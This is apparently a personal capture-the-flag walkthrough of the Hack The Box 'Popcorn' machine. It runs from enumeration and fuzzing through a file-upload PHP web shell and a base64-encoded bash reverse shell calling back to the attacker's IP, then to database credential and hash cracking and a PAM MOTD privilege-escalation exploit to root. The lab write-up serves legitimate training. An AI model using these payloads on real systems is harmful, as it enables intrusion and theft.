
Target : 10.129.36.176

Started off with the port scan : 22,80

Adding `popcorn.htb` in `/etc/hosts` file

Enumerating port : 80

Doing Subdomain Fuzzing using ffuf:

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.popcorn.htb" -u http://popcorn.htb/ -mc 200,404`

![](../Pasted%20image%2020260720132917.png)

Got nothing interesting here.

Directing bruteforcing using gobuster to find the directories:

`gobuster dir -u "http://popcorn.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
.hta                 (Status: 403) [Size: 283]
.htaccess            (Status: 403) [Size: 288]
.htpasswd            (Status: 403) [Size: 288]
cgi-bin/             (Status: 403) [Size: 287]
index                (Status: 200) [Size: 177]
index.html           (Status: 200) [Size: 177]
Progress: 3938 / 4750 (82.91%)[ERROR] error on word server-status: timeout occurred during the request
test                 (Status: 200) [Size: 47363]
torrent              (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
```

/test reveals phpinfo() and /torrent reveals Torrent hoster

Registered an account `test:test`

And there is a `upload` functionality, let's see we can upload a reverse shell payload, over there.

We can upload a torrent and for that we can upload screenshot, that features is not validating whether image is being uploaded - poor content-type validation leads to file upload to RCE

`https://github.com/Anon-Exploiter/exploits/blob/master/torrent_hoster_unauthenticated_rce.py`

Also, we can exploit it manually `upload_file.php?mode=upload&id=` POST

```
<?php
system($_GET['c']);
?>
```

To trigger the payload : 

`http://popcorn.htb/torrent//upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?c=echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzQ0NDQgMD4mMQ==|base64 -d | bash`

Got shell as user : `www-data`

```
www-data@popcorn:/home/george$ cat user.txt 
c9a0ca9ac0b548d65427c75c8293d4e8
```

While reading  `config.php`  got the database credentials.

`torrent : SuperSecret!!`

And in the database folder, i found a md5 hash for user admin

`INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');`

I used `john` to crack it and it is succesful

![](../Pasted%20image%2020260720152301.png)

But, both the credentials were not worked for user `george`

I checked `netstat -ano` to confirm whether mysql service running locally and got it.

![](../Pasted%20image%2020260720152703.png)

Connecting mysql database:

`mysql -u torrent -p`

![](../Pasted%20image%2020260720152734.png)

```
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
| id | userName | password                         | privilege | email                | joined              | lastconnect         |
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
|  3 | Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | admin     | admin@yourdomain.com | 2007-01-06 21:12:46 | 2007-01-06 21:12:46 | 
|  5 | test     | 098f6bcd4621d373cade4e832627b4f6 | user      | test@gmail.com       | 2026-07-20 11:01:04 | 2026-07-20 11:01:04 | 
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
```

Let's crack this `admin` user - hash (not crackable)

While exploring `/home/george/` found a hidden folder `.cache` which reveals motd file. Looking for it reveals a linux privilege escalation vulnerability.

Linux PAM MOTD (CVE-2010-0832) : `https://www.exploit-db.com/exploits/14339`

Used this exploit to gain `root` access

```
root@popcorn:~# cat root.txt 
ec251278154a9c85ac25e411eb3c0fc1
```

![](../Pasted%20image%2020260720160405.png)

To be noted:

1. Got the user flag without any problem.
2. But struggled in root escalation, gone through walkthrough to get to know the escalation path.
